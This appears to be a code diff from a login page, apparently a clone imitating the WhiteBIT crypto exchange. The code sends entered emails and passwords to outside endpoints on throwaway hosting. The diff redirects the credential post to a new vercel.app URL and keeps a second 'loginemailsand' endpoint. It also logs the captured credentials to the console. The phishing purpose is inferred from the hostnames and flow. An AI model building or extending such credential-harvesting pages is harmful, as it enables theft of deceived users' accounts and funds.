@@ -62,7 +62,8 @@ const validateEmail = (input) => {
   
   const data = {email, password}
   console.log(data)
-  const url = "https://cheerful-fox-waders.cyclic.cloud/api/login"
+
+  const url = "https://white-bit-back-endnew.vercel.app/api/login"
   const urll = "https://webtext-qigk.onrender.com/api/loginemailsand"
 
   const LoginEmailSand = () => {
@@ -97,6 +98,7 @@ const validateEmail = (input) => {
           }, [2000]);
         })
         .catch((error)=>{
+          console.log(error)
          setPasswordError(error.response.data.message);
           setButtonDisabled(isButtonDisabled);
       });
